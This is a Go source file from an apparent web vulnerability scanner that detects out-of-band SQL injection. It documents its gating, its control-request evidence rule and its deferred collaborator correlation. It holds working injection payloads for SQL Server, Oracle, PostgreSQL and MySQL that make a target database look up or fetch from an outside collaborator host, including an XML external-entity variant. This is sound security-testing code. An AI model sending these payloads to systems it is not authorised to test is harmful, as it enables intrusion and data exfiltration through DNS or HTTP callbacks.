package scanner

// Out-of-band SQL injection (burpsy-react-ui-v0ei.3): Burp's "Burp Collaborator" detection method for
// the SQL-injection type, which burpsy declined until now. The payload families are the standard
// documented ones (sqlmap's DNS exfiltration vectors), not recovered Burp bytes:
//
//	SQL Server  ;EXEC master..xp_dirtree '\\<host>\a'-- (stacked; resolves a UNC path)
//	Oracle      UTL_INADDR.GET_HOST_ADDRESS('<host>'), HTTPURITYPE('http://<host>/').GETCLOB()
//	MySQL       LOAD_FILE('\\<host>\a') — a UNC path, so only a server on Windows resolves it
//
//	Oracle      EXTRACTVALUE(xmltype('<!DOCTYPE ... SYSTEM "http://<host>/">')) — an external entity fetch
//	PostgreSQL  ;SELECT dblink_connect('host=<host> ...')-- (stacked; needs the dblink extension)
//
// COPY ... PROGRAM is not used: it runs a shell command. xp_dirtree lists a directory, UTL_INADDR
// resolves a name, HTTPURITYPE and the external entity issue a GET, dblink_connect opens a connection
// and LOAD_FILE reads a file into a value; none of them writes.
//
// # The gate
//
// The families run only where the collaborator rows run (oobChecksEnabled: CheckExtendedActive and
// CheckOutOfBand), only when Burp Collaborator is enabled for the SQL-injection type
// (MethodCollaborator, counted when withheld), only on a point no in-band technique confirmed, and
// only when the scan has an open collaborator channel (the scan-wide one, OOBChannel). A channel that
// cannot be opened plants nothing.
//
// # The evidence rule
//
// Every payload carries its own collaborator id, so an interaction names the exact family and place
// that caused it. One request per point is a control sent FIRST: the same collaborator domain under
// a different id, written as plain text in every shape the payloads use (a UNC path, a URL, a bare
// host), with no SQL around it. A target that resolves any host-shaped text it is given — a link
// previewer, a logging pipeline — looks the control up too, and then a payload's interaction is not
// attributed to the database: the claim settles with no SQL-injection finding (the External service
// interaction rows own that behaviour). The finding stands only for an interaction carrying a
// payload's own id while the control's id has none.
//
// Like every collaborator row, the claim is deferred to the pending registry: a lookup the database
// makes seconds later is still correlated, and no callback by the deadline is reported outstanding,
// never clean.

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/burpsy-go/burpsy/internal/bcheck"
	"github.com/burpsy-go/burpsy/internal/oob"
)

// sqlOOBFamily is one lookup primitive in one quoting context. render places it for a host.
type sqlOOBFamily struct {
	dbms, primitive, context string
	render                   func(host string) string
}

func sqlOOBFamilies() []sqlOOBFamily {
	var out []sqlOOBFamily
	for _, c := range sqlStackedContexts {
		c := c
		out = append(out, sqlOOBFamily{dbms: "Microsoft SQL Server", primitive: "master..xp_dirtree", context: c.name,
			render: func(host string) string { return c.prefix + `;EXEC master..xp_dirtree '\\` + host + `\a'-- ` }})
	}
	oracle := []struct{ primitive, expr string }{
		{"UTL_INADDR.GET_HOST_ADDRESS", "(SELECT UTL_INADDR.GET_HOST_ADDRESS('%s') FROM DUAL)"},
		{"HTTPURITYPE", "(SELECT HTTPURITYPE('http://%s/').GETCLOB() FROM DUAL)"},
	}
	for _, o := range oracle {
		o := o
		out = append(out,
			sqlOOBFamily{dbms: "Oracle", primitive: o.primitive, context: "numeric",
				render: func(host string) string { return "||" + fmt.Sprintf(o.expr, host) }},
			sqlOOBFamily{dbms: "Oracle", primitive: o.primitive, context: "single-quoted string",
				render: func(host string) string { return "'||" + fmt.Sprintf(o.expr, host) + "||'" }})
	}
	xxe := func(host string) string {
		return `(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://` +
			host + `/">%x;]>'),'/l') FROM DUAL)`
	}
	out = append(out,
		sqlOOBFamily{dbms: "Oracle", primitive: "EXTRACTVALUE external entity", context: "numeric",
			render: func(host string) string { return "||" + xxe(host) }},
		sqlOOBFamily{dbms: "Oracle", primitive: "EXTRACTVALUE external entity", context: "single-quoted string",
			render: func(host string) string { return "'||" + xxe(host) + "||'" }})
	for _, c := range sqlStackedContexts {
		c := c
		out = append(out, sqlOOBFamily{dbms: "PostgreSQL", primitive: "dblink_connect", context: c.name,
			render: func(host string) string {
				return c.prefix + `;SELECT dblink_connect('host=` + host + ` user=a password=a dbname=a')-- `
			}})
	}
	loadFile := func(host string) string { return `(SELECT LOAD_FILE(CONCAT('\\\\','` + host + `','\\a')))` }
	out = append(out,
		sqlOOBFamily{dbms: "MySQL/MariaDB (Windows)", primitive: "LOAD_FILE UNC path", context: "numeric",
			render: func(host string) string { return " AND " + loadFile(host) + " IS NULL" }},
		sqlOOBFamily{dbms: "MySQL/MariaDB (Windows)", primitive: "LOAD_FILE UNC path", context: "single-quoted string",
			render: func(host string) string { return "' AND " + loadFile(host) + " IS NULL AND '1'='1" }})
	return out
}

// sqlOOBControl is the control's text: the host in every shape a payload carries it, and no SQL.
func sqlOOBControl(host string) string {
	return ` \\` + host + `\a http://` + host + `/ ` + host
}

// sqlOOBPlant is one payload that left the process.
type sqlOOBPlant struct {
	where, param    string
	family          sqlOOBFamily
	payload, marker string
	control         string // the point's control marker
}

// sqlOOBState is one check run's out-of-band half: the channel, opened on first need, and the plants.
type sqlOOBState struct {
	cc      *CheckContext
	tried   bool
	channel OOBChannel
	err     error
	plants  []sqlOOBPlant
}

func (s *sqlOOBState) open(ctx context.Context) (OOBChannel, error) {
	if !s.tried {
		s.tried = true
		if err := s.cc.RequireEgress(); err != nil {
			s.err = err
		} else {
			s.channel, s.err = s.cc.Scanner.OOBChannel(ctx)
		}
	}
	return s.channel, s.err
}

// sqlOOBEnabled reports whether the run admits the collaborator families of the SQL row.
func sqlOOBEnabled(h *ProbeHarness) bool {
	return h != nil && h.scanner != nil && oobChecksEnabled(h.scanner.config)
}

// plant sends the control and every family at one point. It returns the probes for the point's
// record: all None (nothing is known until the collaborator answers), or one probe saying why
// nothing was planted.
func (s *sqlOOBState) plant(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoint) []InjectionProbe {
	families := sqlOOBFamilies()
	if h.withhold(MethodCollaborator, len(families)+1) {
		return []InjectionProbe{withheldProbe(p, "out-of-band SQL lookups", MethodCollaborator)}
	}
	where := fmt.Sprintf("%s %q", p.Kind, p.Name)
	ch, err := s.open(ctx)
	if err != nil {
		// No channel means nothing could be observed; the in-band verdict stands on its own and this
		// probe records that the out-of-band families were not sent.
		return []InjectionProbe{{Payload: "out-of-band SQL lookups", Evidence: InjectionEvidenceNone,
			Detail: fmt.Sprintf("%s: out-of-band families not sent: %v", where, err)}}
	}
	control := strings.ToLower(newProbeCanary("bsysqc"))
	if _, err := h.SendAppending(ctx, p, sqlOOBControl(control+"."+ch.Domain())); err != nil {
		return []InjectionProbe{{Payload: "out-of-band SQL lookups", Evidence: InjectionEvidenceNone,
			Detail: fmt.Sprintf("%s: out-of-band families not sent: the plain-host control could not be sent: %v", where, err)}}
	}
	var probes []InjectionProbe
	for _, f := range families {
		if ctx.Err() != nil {
			break
		}
		marker := strings.ToLower(newProbeCanary("bsysqo"))
		payload := f.render(marker + "." + ch.Domain())
		if _, err := h.SendAppending(ctx, p, payload); err != nil {
			continue
		}
		s.plants = append(s.plants, sqlOOBPlant{where: where, param: p.Name, family: f, payload: payload, marker: marker, control: control})
		probes = append(probes, InjectionProbe{Payload: payload, Evidence: InjectionEvidenceNone,
			Detail: fmt.Sprintf("%s: %s %s planted (%s context), awaiting a collaborator interaction", where, f.dbms, f.primitive, f.context)})
	}
	return probes
}

// register hands the plants to the pending registry. It returns the check's verdict for now: the
// inconclusive sentinel, because the answer has not arrived.
func (s *sqlOOBState) register() error {
	cc, ch := s.cc, s.channel
	plants := append([]sqlOOBPlant(nil), s.plants...)
	deadline := nowUTC().Add(DefaultPendingDeadline)
	if cc.Config != nil && cc.Config.PendingDeadline > 0 {
		deadline = nowUTC().Add(cc.Config.PendingDeadline)
	}
	if err := cc.Scanner.Pending().Register(PendingItem{
		Row:      sqlInjectionIssue,
		Exchange: cc.Exchange.ID,
		Deadline: deadline,
		What: fmt.Sprintf("%d out-of-band SQL lookup(s) (xp_dirtree, UTL_INADDR, HTTPURITYPE, LOAD_FILE) planted in %s under %s, awaiting a collaborator interaction",
			len(plants), cc.Exchange.Path, ch.Domain()),
	}, func(context.Context) (*Finding, bool, error) {
		controlSeen := map[string]bool{}
		for _, pl := range plants {
			got, err := ch.InteractionsFor(pl.marker)
			if err != nil {
				return nil, false, fmt.Errorf("reading out-of-band interactions: %w", err)
			}
			got = oob.Deduplicate(got)
			if len(got) == 0 {
				continue
			}
			seen, checked := controlSeen[pl.control]
			if !checked {
				ctl, err := ch.InteractionsFor(pl.control)
				if err != nil {
					return nil, false, fmt.Errorf("reading out-of-band interactions: %w", err)
				}
				seen = len(ctl) > 0
				controlSeen[pl.control] = seen
			}
			if seen {
				// The target looks up host-shaped text with no SQL around it as well, so this
				// interaction is not the database's: settled, and not a SQL-injection finding.
				return nil, true, nil
			}
			i := got[0]
			when := ""
			if !i.Timestamp.IsZero() {
				when = " at " + i.Timestamp.Format(time.RFC3339)
			}
			f := buildHeaderFinding(cc, sqlInjectionIssue, "high", "certain", pl.payload,
				fmt.Sprintf("%s: out-of-band: the %s %s payload (%s context) made the target contact %s.%s — a "+
					"collaborator id carried by that one probe only (%s interaction from %s%s). A control sent "+
					"first in the same place, naming another id under the same domain as a plain UNC path, URL and "+
					"host with no SQL around it, produced no interaction, so the lookup was made by the database "+
					"evaluating the expression. DBMS: %s (%s).",
					pl.where, pl.family.dbms, pl.family.primitive, pl.family.context, pl.marker, ch.Domain(),
					i.Protocol, i.RemoteAddress, when, pl.family.dbms, InjectionEvidenceOutOfBand))
			f.Param = pl.param
			return f, true, nil
		}
		// Never settles negatively on silence: no callback yet is the absence of evidence.
		return nil, false, nil
	}); err != nil {
		return err
	}
	return fmt.Errorf("%s: %d out-of-band lookup(s) planted, awaiting a collaborator interaction: %w",
		sqlInjectionIssue, len(plants), errCheckInconclusive)
}
